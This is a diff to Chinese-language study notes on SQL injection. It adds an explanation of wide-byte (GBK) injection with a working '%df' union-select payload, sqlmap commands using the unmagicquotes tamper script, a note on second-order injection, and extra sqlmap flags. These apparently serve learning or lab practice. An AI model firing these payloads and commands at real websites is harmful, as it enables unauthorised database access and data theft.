@@ -180,14 +180,43 @@ sql注入：
 
     绕过去除select和union：
         同上
-        
+
+    宽字节注入：
+        ASCII 编码 占用一个字节
+        GBK 编码 占用两个字节表示一个字符 为宽字节
+
+        PHP 中编码为 GBK，函数执行添加的是 ASCII，MySQL 默认是 GBK
+
+
+        注入时被添加反斜杠，
+            比如注入单引号 ---> \'
+            此时URL编码为 %5c%27
+        如果MySQL 使用 GBK，在 GBK 编码里两个字节为一个字符，此时只要在前面再加一个字节和 %5c 组成一个字符，即可剩下 %27 即单引号来闭合 SQL 注入语句
+
+        注入语句：
+            ?id=-1%df' union select 1,2,3
+
+        sqlmap:
+            sqlmap.py -u "url?id=1%df%27" --search --level 3 --risk 1 --thread 10
+
+        注入字符ASCII码大于128即可，十进制->十六进制，在十六进制前加%
+
+        sqlmap:
+            sqlmap.pu -u "url?id=1" --tamper=unmagicquotes.py
+
+    二次注入：
+        先 payload 存入服务器，二次读取时 payload 被执行
+
     SQLmap： 
         探测：
             -u 探测url
             --dbs 探测数据库
             --current-db 查看当前数据库
             -batch 默认选择
+            --search 自动获取数据库名表名等
+            --thread 10 10个线程来探测
             --technique T 指定探测技术 time
+            --tamper 指定解码
             --file-read
             --file-write
             --file-dest
